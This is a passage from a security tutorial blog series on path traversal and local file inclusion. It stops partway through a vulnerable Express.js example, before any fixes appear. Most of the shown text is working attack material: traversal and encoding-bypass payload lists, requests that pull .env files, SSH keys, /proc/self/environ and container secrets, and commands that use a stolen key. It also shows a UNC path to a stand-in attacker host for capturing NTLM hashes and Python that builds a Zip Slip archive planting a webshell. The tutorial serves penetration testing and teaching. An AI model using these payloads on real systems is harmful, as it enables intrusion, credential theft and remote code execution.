# Security Deep Dive Part 8: Path Traversal, LFI, and Internal File Disclosure -- The Complete Exploitation and Defense Guide

---

**Series:** Application Security Deep Dive -- Offensive and Defensive Techniques for Modern Web Applications
**Part:** 8 (Path Traversal, LFI, and Internal File Disclosure)
**Audience:** Bug bounty hunters, penetration testers, security researchers, and backend developers who understand HTTP, Linux, Docker, Node.js, FastAPI, and AWS fundamentals
**Reading time:** ~55 minutes

---

**Meta Description:** A comprehensive technical guide to path traversal and Local File Inclusion (LFI) vulnerabilities. Covers classic ../ sequences, null byte injection, .env file exfiltration, Docker secrets leakage, /proc enumeration, double URL encoding bypasses, log poisoning chains, and complete Burp Suite workflows with real payloads, vulnerable code samples, and hardened fixes in Express.js and FastAPI.

**Slug:** `path-traversal-lfi-internal-file-disclosure-complete-guide`

**Keywords:** path traversal, local file inclusion, LFI, directory traversal, dot-dot-slash, null byte injection, .env file exposure, Docker secrets leakage, /proc/self/environ, log poisoning, LFI to RCE, Burp Suite path traversal, Express.js path traversal fix, FastAPI file disclosure, file download vulnerability, double URL encoding bypass, bug bounty file read

---

## Introduction

Path traversal and Local File Inclusion remain among the most consistently exploitable vulnerability classes in web applications. Despite decades of awareness, they persist because developers continue to build file-serving endpoints, template engines, and download handlers that accept user-controlled input without adequate path validation. In 2024 and 2025 alone, CVEs involving path traversal appeared in major products including Apache Struts, Ivanti Connect Secure, and Fortinet FortiOS -- each leading to mass exploitation in the wild.

The core mechanic is deceptively simple: an attacker manipulates a file path parameter to escape the intended directory and read (or sometimes write) arbitrary files on the server. But the practical exploitation surface is enormous. A single path traversal vulnerability can yield database credentials from `.env` files, private SSH keys, Docker secrets, AWS IAM credentials from instance metadata, application source code, and in chained scenarios, full Remote Code Execution through log poisoning.

This article is a practitioner's reference. We cover every major traversal technique, every file target worth pursuing, every bypass for common filters, and complete exploitation workflows in Burp Suite. We provide vulnerable Express.js and FastAPI code alongside hardened versions. Every payload is realistic. Every scenario is drawn from patterns observed in real bug bounty programs and penetration tests.

If you test web applications for a living, bookmark this one.

---

## Table of Contents

1. [Classic Path Traversal: The ../ Sequence](#1-classic-path-traversal-the--sequence)
2. [Null Byte Injection (%00) for Extension Bypass](#2-null-byte-injection-00-for-extension-bypass)
3. [Accessing .env Files Through Path Traversal](#3-accessing-env-files-through-path-traversal)
4. [Reading Application Logs (/var/log/)](#4-reading-application-logs-varlog)
5. [Reading Internal Config Files](#5-reading-internal-config-files-database-configs-api-keys)
6. [Exposing Source Code Through LFI](#6-exposing-source-code-through-lfi)
7. [Reading SSH Keys (~/.ssh/id_rsa)](#7-reading-ssh-keys-sshid_rsa)
8. [Docker Secrets Leakage](#8-docker-secrets-leakage)
9. [/proc/self/cmdline and /proc/self/environ Enumeration](#9-procselfcmdline-and-procselfenviron-enumeration)
10. [Windows-Specific Path Traversal](#10-windows-specific-path-traversal)
11. [Double URL Encoding Bypass](#11-double-url-encoding-bypass)
12. [Path Traversal in File Download Endpoints](#12-path-traversal-in-file-download-endpoints)
13. [Express.js Vulnerable File Serve Endpoint + Fixed Code](#13-expressjs-vulnerable-file-serve-endpoint--fixed-code)
14. [FastAPI Vulnerable File Endpoint + Fixed Code](#14-fastapi-vulnerable-file-endpoint--fixed-code)
15. [Burp Suite Intruder with Traversal Wordlists](#15-burp-suite-intruder-with-traversal-wordlists)
16. [Chaining LFI with Log Poisoning for RCE](#16-chaining-lfi-with-log-poisoning-for-rce)
17. [Common Developer Mistakes](#17-common-developer-mistakes)
18. [Detection Strategies](#18-detection-strategies)
19. [Prevention Strategies](#19-prevention-strategies)
20. [Bug Bounty Report Example](#20-bug-bounty-report-example)
21. [Lab Setup Ideas](#21-lab-setup-ideas)
22. [Conclusion](#22-conclusion)

---

## 1. Classic Path Traversal: The ../ Sequence

### How It Works

Every filesystem has a hierarchy. The `..` directory entry refers to the parent of the current directory. When a web application constructs a file path by concatenating user input to a base directory, an attacker supplies `../` sequences to climb out of the intended directory and reach arbitrary locations on the filesystem.

Consider an application serving user-uploaded avatars:

```
GET /api/files?name=avatar.png
```

The server constructs the path internally:

```
/var/www/app/uploads/ + avatar.png = /var/www/app/uploads/avatar.png
```

An attacker sends:

```
GET /api/files?name=../../../../etc/passwd
```

The server constructs:

```
/var/www/app/uploads/../../../../etc/passwd = /etc/passwd
```

The operating system resolves the `..` segments, walking up the directory tree until it reaches `/etc/passwd`.

### Fundamental Payloads

These are the baseline payloads every tester should try first:

```
../../../etc/passwd
../../../etc/shadow
../../../etc/hostname
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
```

The reason for varying depth is that you rarely know how deep the base directory is. Six to eight levels of `../` will reach the root from virtually any location on a Linux filesystem.

### HTTP Request Example

```http
GET /api/download?file=../../../../etc/passwd HTTP/1.1
Host: target.example.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
Accept: */*
```

**Expected Response (Successful Traversal):**

```http
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Disposition: attachment; filename="passwd"

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
```

### Variations for Filter Bypass

Developers sometimes implement naive filters. These bypass common ones:

| Payload | Bypasses |
|---------|----------|
| `....//....//....//etc/passwd` | Filters that strip a single `../` |
| `..\/..\/..\/etc/passwd` | Filters checking only forward slash |
| `..%2f..%2f..%2fetc/passwd` | Filters on literal `../` before URL decoding |
| `..%252f..%252f..%252fetc/passwd` | Double URL encoding (more in Section 11) |
| `..%c0%af..%c0%af..%c0%afetc/passwd` | Overlong UTF-8 encoding of `/` |
| `/....//....//....//etc/passwd` | Leading slash + double-dot with extra dot |

### Key Insight for Testers

Always try reading `/etc/passwd` first -- it is world-readable on every Linux system and its format is immediately recognizable. If you can read it, you have confirmed the traversal and can proceed to high-value targets. Do not jump to sensitive files until you have a confirmed read primitive.

---

## 2. Null Byte Injection (%00) for Extension Bypass

### The Technique

In languages where strings are C-style null-terminated (older PHP, some Java frameworks, older Python modules), a null byte (`%00`) in the middle of a string causes everything after it to be ignored by the underlying C library file operations, while the application-level code still sees the full string.

This is devastatingly effective when an application appends a file extension:

```python
# Application logic (pseudocode)
filename = user_input + ".png"
# user_input = "../../../../etc/passwd%00"
# filename becomes "../../../../etc/passwd\x00.png"
# C library open() sees "../../../../etc/passwd" and ignores .png
```

### Payloads

```
../../../../etc/passwd%00
../../../../etc/passwd%00.png
../../../../etc/passwd%00.jpg
../../../../etc/passwd%00.pdf
../../../../etc/shadow%00.txt
```

### HTTP Request Example

```http
GET /api/image?file=../../../../etc/passwd%00.png HTTP/1.1
Host: target.example.com
Cookie: session=abc123
```

### Historical Context and Current Relevance

Null byte injection was most devastating in PHP versions before 5.3.4 (2010), where `include()`, `fopen()`, and `file_get_contents()` were all vulnerable. Modern PHP, Python 3, and Node.js `fs` module reject null bytes in paths by default.

However, this technique remains relevant for:

- **Legacy applications** still running PHP 5.x (more common than you think)
- **Custom C/C++ backends** or CGI programs
- **Applications using native bindings** that pass strings to C libraries
- **Edge cases** in some Java frameworks when using `java.io.File` with certain JVM configurations

### Testing Methodology

Even on modern stacks, always include null byte payloads in your wordlists. The cost is zero (a few extra requests) and occasionally you hit a legacy code path or a native extension that is vulnerable. Some WAFs also do not inspect past null bytes, so even if the application is not vulnerable, the null byte can bypass WAF rules protecting against path traversal in subsequent parameters.

---

## 3. Accessing .env Files Through Path Traversal

### Why .env Files Are the Holy Grail

The `.env` file pattern, popularized by the "twelve-factor app" methodology and libraries like `dotenv`, stores environment-specific configuration. In practice, developers dump everything sensitive into `.env`:

```env
DATABASE_URL=postgresql://admin:s3cretP@ss!@db.internal.example.com:5432/production
REDIS_URL=redis://:authpassword@redis.internal.example.com:6379/0
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
JWT_SECRET=a1b2c3d4e5f6g7h8i9j0-super-secret-key-do-not-share
STRIPE_SECRET_KEY=sk_live_51ABC123DEF456...
SENDGRID_API_KEY=SG.xxxxxxxxxxxxxxxxxxxx.xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
ADMIN_EMAIL=admin@example.com
ADMIN_PASSWORD=TemporaryAdminPass123!
```

A single `.env` file read can compromise the entire infrastructure: database access, cloud provider accounts, payment processing, email services, and admin credentials.

### Common .env Locations

```
.env
../.env
../../.env
../../../.env
/var/www/app/.env
/var/www/html/.env
/home/node/app/.env
/home/deploy/app/.env
/opt/app/.env
/srv/app/.env
/app/.env
```

### Path Traversal Payloads Targeting .env

```
../../../../var/www/app/.env
../../../../home/node/app/.env
../../../../opt/app/.env
../../../../app/.env
../.env
../../.env
../../../.env
../../../../.env
../../../../../.env
```

### HTTP Request Example

```http
GET /api/files/download?path=../../../.env HTTP/1.1
Host: target.example.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
```

### Real-World Impact Chain

1. Read `.env` via path traversal
2. Extract `DATABASE_URL` with credentials
3. Connect to PostgreSQL directly (if exposed or via SSRF)
4. Dump user table, payment data, PII
5. Extract `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY`
6. Enumerate S3 buckets, EC2 instances, IAM roles
7. Achieve full cloud account compromise

This chain from a single file read to complete infrastructure takeover is why `.env` exposure is consistently rated Critical severity.

---

## 4. Reading Application Logs (/var/log/)

### Why Logs Matter

Application and system logs frequently contain data that attackers can use for further exploitation:

- **Session tokens** logged in URL query parameters
- **API keys** logged in request headers
- **Database queries** with parameter values (including passwords in login attempts)
- **Internal IP addresses** and hostnames
- **Stack traces** revealing code paths and library versions
- **User credentials** from failed login attempts logged verbatim

### High-Value Log Files

```
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/syslog
/var/log/auth.log
/var/log/mail.log
/var/log/postgresql/postgresql-15-main.log
/var/log/mongodb/mongod.log
/var/log/redis/redis-server.log
/var/log/app/application.log
/var/log/pm2/pm2.log
/tmp/express-debug.log
```

### HTTP Request Example

```http
GET /static/../../../../var/log/nginx/access.log HTTP/1.1
Host: target.example.com
Accept: text/plain
```

### What to Look For in Logs

```
# Session tokens in URLs
192.168.1.50 - - [15/Mar/2025:10:23:45 +0000] "GET /dashboard?token=eyJhbGciOiJI... HTTP/1.1" 200 5432

# API keys in headers (logged at debug level)
[DEBUG] Request headers: { "x-api-key": "sk-proj-abc123...", "authorization": "Bearer eyJ..." }

# Database errors with credentials
[ERROR] FATAL: password authentication failed for user "dbadmin" (attempted password: "Pr0duction_DB_2025!")

# Internal service discovery
[INFO] Connecting to internal service at http://10.0.3.47:8080/api/v2/users
[INFO] Redis connection established: redis://10.0.3.12:6379
```

### Log File Sizes

One practical consideration: log files can be massive. A `/var/log/nginx/access.log` on a production server can be gigabytes. If the application streams the file, your response may timeout or be enormous. Check for rotated logs that are smaller:

```
/var/log/nginx/access.log.1
/var/log/nginx/error.log.1
/var/log/nginx/access.log.2.gz
```

Note: `.gz` files will be binary and unreadable via LFI unless the application decompresses them.

---

## 5. Reading Internal Config Files (Database Configs, API Keys)

### Target Files by Technology Stack

**Node.js Applications:**
```
config/default.json
config/production.json
config/database.js
config/config.js
.env
.env.production
.env.local
package.json          (reveals dependencies and versions)
package-lock.json     (exact dependency versions for CVE hunting)
ecosystem.config.js   (PM2 config, may contain env vars)
```

**Python/FastAPI Applications:**
```
config.py
settings.py
config/settings.py
.env
alembic.ini          (database connection string)
pyproject.toml       (dependency versions)
requirements.txt     (dependency versions for CVE hunting)
```

**General Linux/Server:**
```
/etc/shadow                    (password hashes, requires root)
/etc/mysql/my.cnf              (MySQL config)
/etc/postgresql/15/main/pg_hba.conf  (PostgreSQL auth config)
/etc/mongod.conf               (MongoDB config)
/etc/redis/redis.conf          (Redis config, may contain requirepass)
/etc/nginx/nginx.conf          (Nginx config, reveals internal routing)
/etc/nginx/sites-enabled/default
/etc/apache2/sites-enabled/000-default.conf
/etc/crontab                   (cron jobs, reveals scripts and paths)
```

**AWS-Specific:**
```
~/.aws/credentials             (AWS access keys)
~/.aws/config                  (AWS region, role ARNs)
/var/run/secrets/aws/credentials
```

### HTTP Request Examples

```http
GET /api/template?file=../../../../etc/nginx/sites-enabled/default HTTP/1.1
Host: target.example.com
```

**Reading Nginx config reveals internal architecture:**

```nginx
upstream backend_api {
    server 10.0.1.15:3000;
    server 10.0.1.16:3000;
    server 10.0.1.17:3000;
}

server {
    listen 80;
    server_name api.internal.example.com;

    location /admin {
        # Internal admin panel - no auth required from internal network
        proxy_pass http://10.0.1.20:8080;
    }

    location /api/v1 {
        proxy_pass http://backend_api;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Internal-Auth s3cret-internal-token-2025;
    }
}
```

This single file read reveals: internal IP addresses, load balancing topology, an unprotected admin panel, and a hardcoded internal auth token.

### Redis Configuration Exposure

```http
GET /files?doc=../../../../etc/redis/redis.conf HTTP/1.1
Host: target.example.com
```

```
# Redis config excerpt
bind 0.0.0.0
port 6379
requirepass "R3dis_Pr0duction_P@ssw0rd!"
```

With the Redis password, an attacker with network access (or SSRF) can connect and execute arbitrary Redis commands, potentially leading to RCE via Redis module loading or `CONFIG SET dir/dbfilename` writes.

---

## 6. Exposing Source Code Through LFI

### Why Source Code Exposure Matters

Reading the application's own source code is often more valuable than reading system files. Source code reveals:

- **Hardcoded secrets** (API keys, encryption keys, admin credentials)
- **Business logic flaws** that are invisible from black-box testing
- **SQL queries** that may be injectable
- **Authentication/authorization logic** with bypassable checks
- **Internal API endpoints** not documented or linked in the UI
- **Vulnerability patterns** in input validation, file handling, crypto usage

### Finding the Application Root

First, determine where the application code lives. Common locations:

```
/var/www/app/
/var/www/html/
/home/node/app/
/home/deploy/app/
/opt/app/
/srv/app/
/app/                    (common in Docker containers)
```

You can narrow this down by reading `/proc/self/cmdline` (Section 9) which reveals the process command line, or `/proc/self/cwd` which is a symlink to the working directory.

### Key Files to Target

**Node.js/Express:**
```
app.js
server.js
index.js
routes/index.js
routes/auth.js
routes/admin.js
middleware/auth.js
controllers/userController.js
models/User.js
config/database.js
```

**Python/FastAPI:**
```
main.py
app.py
app/main.py
app/routers/auth.py
app/routers/admin.py
app/models.py
app/database.py
app/config.py
app/dependencies.py
```

### HTTP Request Example

```http
GET /api/static?resource=../../../../app/server.js HTTP/1.1
Host: target.example.com
```

**Response revealing hardcoded JWT secret:**

```javascript
const express = require('express');
const jwt = require('jsonwebtoken');
const app = express();

// TODO: move to env var
const JWT_SECRET = 'my-super-secret-jwt-key-2025-production';
const ADMIN_API_KEY = 'adm_k3y_7f8a9b2c3d4e5f6g';

app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;
  // WARNING: SQL injection here
  const query = `SELECT * FROM users WHERE email = '${email}' AND password = '${password}'`;
  // ...
});
```

A single file read exposed: a hardcoded JWT secret (allowing arbitrary token forgery), an admin API key, and a SQL injection vulnerability.

---

## 7. Reading SSH Keys (~/.ssh/id_rsa)

### The Attack

If the web application process runs under a user that has SSH keys, path traversal can exfiltrate private keys, enabling direct SSH access to the server or other systems the key authenticates to.

### Target Paths

```
~/.ssh/id_rsa
~/.ssh/id_ecdsa
~/.ssh/id_ed25519
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/home/deploy/.ssh/id_rsa
/home/ubuntu/.ssh/id_rsa
/home/ec2-user/.ssh/id_rsa
/home/www-data/.ssh/id_rsa
~/.ssh/known_hosts              (reveals other hosts this server connects to)
~/.ssh/config                   (reveals SSH aliases and jump hosts)
```

### HTTP Request Example

```http
GET /api/download?file=../../../../../root/.ssh/id_rsa HTTP/1.1
Host: target.example.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
```

**Response:**

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBmN2Z3bjI5d2h4dWFzOGRhc2Rhc2RzYWRhc2Rhc2RzYQAAAJgAAAAA
...
-----END OPENSSH PRIVATE KEY-----
```

### Post-Exploitation

```bash
# Save the key
echo "-----BEGIN OPENSSH PRIVATE KEY-----
b3Blbn..." > stolen_key.pem

# Fix permissions
chmod 600 stolen_key.pem

# Read known_hosts or SSH config to find targets
# (already exfiltrated via LFI)
# known_hosts revealed: 10.0.2.50, 10.0.2.51, github.com

# Connect
ssh -i stolen_key.pem root@10.0.2.50
ssh -i stolen_key.pem deploy@target.example.com
```

### Reading authorized_keys for Lateral Intelligence

Even if you cannot get the private key, reading `authorized_keys` reveals:

```
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... deploy@ci-server.internal.example.com
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... admin@jumpbox.example.com
```

This reveals the CI/CD server hostname and that an admin connects from a jumpbox -- valuable for understanding the infrastructure topology.

---

## 8. Docker Secrets Leakage

### /proc/self/environ

Inside a Docker container, `/proc/self/environ` contains all environment variables passed to the process, including those set via `docker run -e`, `docker-compose.yml` `environment:` blocks, and Docker Swarm secrets mounted as env vars.

```http
GET /api/files?name=../../../proc/self/environ HTTP/1.1
Host: target.example.com
```

**Response (null-byte separated, shown with newlines for readability):**

```
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=a1b2c3d4e5f6
NODE_ENV=production
DATABASE_URL=postgresql://prod_user:Xy7$mK9!pQ2w@db.internal:5432/production
REDIS_URL=redis://:r3d1s_s3cret@redis.internal:6379/0
JWT_SECRET=production-jwt-secret-2025-do-not-leak
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
AWS_DEFAULT_REGION=us-east-1
STRIPE_SECRET_KEY=sk_live_51Hx...
```

**Critical note:** The environment variables in `/proc/self/environ` are separated by null bytes (`\x00`), not newlines. In a raw HTTP response, this looks like a continuous string. Use `tr '\0' '\n'` if processing locally, or look at the raw hex in Burp Suite.

### Docker Swarm Secrets

Docker Swarm mounts secrets as files under `/run/secrets/`:

```http
GET /api/files?name=../../../run/secrets/db_password HTTP/1.1
Host: target.example.com
```

```http
GET /api/files?name=../../../run/secrets/api_key HTTP/1.1
Host: target.example.com
```

### Enumerating Docker Secrets

You cannot list the `/run/secrets/` directory via path traversal (you can only read individual files if you know the name). Common secret names to try:

```
/run/secrets/db_password
/run/secrets/db_host
/run/secrets/db_user
/run/secrets/db_name
/run/secrets/redis_password
/run/secrets/jwt_secret
/run/secrets/api_key
/run/secrets/aws_access_key
/run/secrets/aws_secret_key
/run/secrets/ssl_cert
/run/secrets/ssl_key
/run/secrets/encryption_key
```

### Docker Socket

If the Docker socket is mounted inside the container (a common misconfiguration for CI/CD containers):

```
/var/run/docker.sock
```

While you cannot read the socket as a file via LFI, confirming its existence is valuable because it means a subsequent RCE in the container leads to host breakout via Docker socket abuse.

### Kubernetes Secrets

In Kubernetes environments, service account tokens and secrets are mounted at predictable paths:

```
/var/run/secrets/kubernetes.io/serviceaccount/token
/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
/var/run/secrets/kubernetes.io/serviceaccount/namespace
```

The service account token can be used to interact with the Kubernetes API server, potentially enumerating or modifying cluster resources.

```http
GET /api/files?name=../../../var/run/secrets/kubernetes.io/serviceaccount/token HTTP/1.1
Host: target.example.com
```

---

## 9. /proc/self/cmdline and /proc/self/environ Enumeration

### Understanding /proc/self/

The Linux `/proc` filesystem is a pseudo-filesystem that exposes kernel and process information. `/proc/self/` is a symbolic link to the `/proc/[PID]/` directory of the calling process -- in this case, the web server process handling your request.

### /proc/self/cmdline

Reveals the exact command used to start the process:

```http
GET /download?file=../../../proc/self/cmdline HTTP/1.1
Host: target.example.com
```

**Response (null-byte separated):**

```
node/app/server.js--port3000--env=production
```

This tells you: the application is Node.js, the entry point is `/app/server.js`, it runs on port 3000, and it is in production mode. Now you know exactly what source file to read.

### /proc/self/environ

As covered in Section 8, this reveals all environment variables. It is the single most valuable `/proc` file for attackers.

### /proc/self/cwd

A symlink to the process's current working directory. While you cannot read a symlink via LFI, you can use it in path construction:

```http
GET /download?file=../../../proc/self/cwd/server.js HTTP/1.1
Host: target.example.com
```

This resolves to whatever the working directory is, letting you read source code without knowing the absolute path.

### /proc/self/fd/ (File Descriptors)

Each open file descriptor is available as a symlink under `/proc/self/fd/`. This can reveal files the process has open:

```
/proc/self/fd/0    (stdin)
/proc/self/fd/1    (stdout)
/proc/self/fd/2    (stderr)
/proc/self/fd/3    (often the listening socket)
/proc/self/fd/4+   (open files, database connections, log files)
```

Iterating through file descriptors can reveal log file contents, temporary files, and sometimes deleted files that are still open:

```http
GET /download?file=../../../proc/self/fd/5 HTTP/1.1
GET /download?file=../../../proc/self/fd/6 HTTP/1.1
GET /download?file=../../../proc/self/fd/7 HTTP/1.1
```

### /proc/self/maps

Reveals the memory map of the process, including loaded shared libraries and their addresses. Useful for ASLR bypass if you are chaining with a memory corruption vulnerability:

```http
GET /download?file=../../../proc/self/maps HTTP/1.1
Host: target.example.com
```

**Response excerpt:**

```
55f3c8a00000-55f3c8a25000 r--p 00000000 08:01 1048621  /usr/local/bin/node
55f3c8a25000-55f3c8e9c000 r-xp 00025000 08:01 1048621  /usr/local/bin/node
7f1234560000-7f1234580000 r--p 00000000 08:01 262147   /lib/x86_64-linux-gnu/libc.so.6
```

### /proc/self/status

Contains process status information:

```
Name:   node
Umask:  0022
State:  S (sleeping)
Pid:    1
PPid:   0
Uid:    1000    1000    1000    1000
Gid:    1000    1000    1000    1000
Groups: 1000
```

### /proc/self/net/tcp

Reveals all TCP connections as hex-encoded entries. Useful for discovering internal services:

```
sl  local_address rem_address   st tx_queue rx_queue
 0: 00000000:0BB8 00000000:0000 0A 00000000:00000000
 1: 0F00000A:C2A8 2103000A:1538 01 00000000:00000000
```

Decoding: `0F00000A` = `10.0.0.15`, `C2A8` = port 49832, connected to `2103000A` = `10.0.0.33`, port `5432` (PostgreSQL).

### Complete /proc Enumeration Checklist

```
/proc/self/cmdline
/proc/self/environ
/proc/self/cwd/
/proc/self/status
/proc/self/maps
/proc/self/net/tcp
/proc/self/net/tcp6
/proc/self/net/udp
/proc/self/fd/0 through /proc/self/fd/20
/proc/self/mounts
/proc/version
/proc/cpuinfo
/proc/net/arp          (reveals hosts on the local network)
/proc/net/route        (reveals network routing table)
/proc/sched_debug      (reveals all running processes on the host)
```

---

## 10. Windows-Specific Path Traversal

### Backslash vs. Forward Slash

Windows accepts both `\` and `/` as path separators. Additionally, many web frameworks normalize `/` to `\` on Windows. This means:

```
..\..\..\..\windows\win.ini
....\\....\\....\\windows\\win.ini
..\/..\/..\/windows/win.ini
```

### Proof-of-Concept File

On Windows, the equivalent of `/etc/passwd` for confirming traversal is:

```
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\config\SAM        (requires SYSTEM privileges)
```

### Payloads

```
..\..\..\..\windows\win.ini
../../../../windows/win.ini
..%5c..%5c..%5c..%5cwindows%5cwin.ini
..%255c..%255c..%255c..%255cwindows%255cwin.ini
....\/....\/....\/windows/win.ini
```

### UNC Path Injection

On Windows servers, you can attempt UNC paths to force SMB authentication to an attacker-controlled server, capturing NTLMv2 hashes:

```
\\attacker.example.com\share\file.txt
```

```http
GET /api/download?file=\\attacker.example.com\share\file.txt HTTP/1.1
Host: target.example.com
```

On the attacker side, run Responder or Impacket's `smbserver.py` to capture the hash:

```bash
impacket-smbserver share /tmp -smb2support
```

### Windows-Specific High-Value Files

```
C:\inetpub\wwwroot\web.config          (IIS config with connection strings)
C:\Windows\System32\inetsrv\config\applicationHost.config
C:\xampp\apache\conf\httpd.conf
C:\xampp\mysql\data\mysql\user.MYD      (MySQL user password hashes)
C:\Users\Administrator\.ssh\id_rsa
C:\Users\Administrator\Desktop\*.txt    (if you can list directories)
C:\ProgramData\Amazon\EC2Launch\log\    (AWS EC2 Windows instance logs)
```

### IIS Short Filename Enumeration

While not directly path traversal, IIS short filenames (8.3 format) can be used alongside traversal to discover files:

```
GET /api/download?file=..\..\..\..\inetpub\wwwroot\WEB~1.CON HTTP/1.1
```

---

## 11. Double URL Encoding Bypass

### The Mechanism

URL encoding converts special characters to `%XX` format. Double URL encoding encodes the `%` itself, creating `%25XX`. When the application or a middleware decodes the URL once, the double-encoded value becomes a single-encoded value. If another layer decodes it again, the special character is restored.

```
../     = normal
%2e%2e/ = single URL encoded (. = %2e)
%252e%252e%252f = double URL encoded (% = %25, so %2e becomes %252e)
..%2f   = only the slash encoded
..%252f = double-encoded slash
```

### Why This Works

Consider a WAF or input filter that checks the decoded input for `../`:

1. Request arrives: `..%252f..%252f..%252fetc/passwd`
2. WAF decodes once: `..%2f..%2f..%2fetc/passwd` -- no `../` found, WAF passes it through
3. Application decodes again: `../../../etc/passwd` -- traversal succeeds

This bypass works when there is a decode mismatch: the security filter decodes N times, but the application (or a middleware) decodes N+1 times.

### Comprehensive Double Encoding Payloads

```
# Double-encoded ../
%252e%252e%252f

# Double-encoded ..\
%252e%252e%255c

# Mixed encoding
..%252f
%252e%252e/
..%255c
%252e%252e\

# Triple encoding (rare but worth trying)
%25252e%25252e%25252f
```

### HTTP Request Example

```http
GET /static/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd HTTP/1.1
Host: target.example.com
Accept: */*
```

### Burp Suite Decoder Workflow

In Burp Suite, you can use the Decoder tab to iteratively encode payloads:

1. Type `../../../etc/passwd` in the input
2. Select "Encode as" -> "URL"
3. Result: `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`
4. Select the result, "Encode as" -> "URL" again
5. Result: `%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd`

Use this double-encoded value in your request.

### Other Encoding Bypasses

```
# Overlong UTF-8 encoding of / (0x2f)
%c0%af          (2-byte overlong)
%e0%80%af       (3-byte overlong)

# Overlong UTF-8 encoding of . (0x2e)
%c0%ae          (2-byte overlong)

# Overlong UTF-8 encoding of \ (0x5c)
%c0%9c          (2-byte overlong)

# 16-bit Unicode encoding
%u002e%u002e%u002f    (../)
..%u002f              (../)
```

---

## 12. Path Traversal in File Download Endpoints

### The Pattern

File download endpoints are the most common location for path traversal vulnerabilities. They typically follow one of these patterns:

```
GET /api/download?file=report.pdf
GET /api/export?filename=data.csv
GET /api/attachment/{filename}
GET /files/{id}/{filename}
POST /api/document/download  (filename in JSON body)
```

### POST-Based File Download

Developers sometimes think that using POST makes file downloads safer because the filename is not in the URL. It does not.

```http
POST /api/document/download HTTP/1.1
Host: target.example.com
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...

{
  "documentId": "12345",
  "filename": "../../../../etc/passwd"
}
```

### Filename in Path Segments

```http
GET /api/files/user-uploads/../../../../etc/passwd HTTP/1.1
Host: target.example.com
```

Some frameworks decode path segments differently from query parameters. Express.js, for example, automatically decodes `%2f` in path segments in some configurations but not others, depending on the `app.set('strict routing')` and reverse proxy settings.

### Content-Disposition Header Analysis

When testing file download endpoints, watch the `Content-Disposition` header:

```http
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Disposition: attachment; filename="passwd"
Content-Length: 2549
```

If the filename in the disposition header is `passwd` (the last segment of your traversal path), the traversal worked. If it is `....%2f....%2f....%2fetc%2fpasswd`, the application is treating your input as a literal filename and not resolving it.

### Zip Slip (Path Traversal in Archive Extraction)

While not a direct LFI, Zip Slip deserves mention. When an application extracts uploaded ZIP/TAR archives, a malicious archive can contain entries with traversal paths:

```
../../../../../../var/www/app/server.js
```

Extracting this archive overwrites the application's `server.js` with attacker-controlled content. This is a write primitive, not a read primitive, and leads directly to RCE.

Creating a malicious zip:

```python
import zipfile
import io

zip_buffer = io.BytesIO()
with zipfile.ZipFile(zip_buffer, 'w') as zf:
    # Write a webshell to the application root
    zf.writestr(
        '../../../../../../var/www/app/public/shell.js',
        'require("child_process").exec(require("url").parse(require("http").IncomingMessage.prototype.url,true).query.cmd)'
    )
zip_buffer.seek(0)

with open('malicious.zip', 'wb') as f:
    f.write(zip_buffer.read())
```

---

## 13. Express.js Vulnerable File Serve Endpoint + Fixed Code

### Vulnerable Code

```javascript
const express = require('express');
const path = require('path');
const fs = require('fs');
const app = express();

const UPLOAD_DIR = path.join(__dirname, 'uploads');

// VULNERABLE: Direct concatenation with user input
app.get('/api/files/download', (req, res) => {
  const filename = req.query.file;

  if (!filename) {
    return res.status(400).json({ error: 'Filename required' });
  }

  const filePath = path.join(UPLOAD_DIR, filename);

  // This check is INSUFFICIENT - path.join resolves ../ sequences
  // but does not prevent escaping UPLOAD_DIR
  fs.access(filePath, fs.constants.R_OK, (err) => {
    if (err) {
      return res.status(404).json({ error: 'File not found' });
    }
    res.sendFile(filePath);
  });
});

// VULNERABLE: Even worse - using string concatenation
app.get('/api/files/view', (req, res) => {
  const filename = req.query.name;
  const filePath = UPLOAD_DIR + '/' + filename;

  fs.readFile(filePath, 'utf8', (err, data) => {
    if (err) {
      return res.status(404).json({ error: 'File not found' });
    }
    res.send(data);
  });
});

// VULNERABLE: Naive blacklist filter
app.get('/api/files/safe-download', (req, res) => {
  let filename = req.query.file;

  // This filter is trivially bypassed
  filename = filename.replace('../', '');

  const filePath = path.join(UPLOAD_DIR, filename);
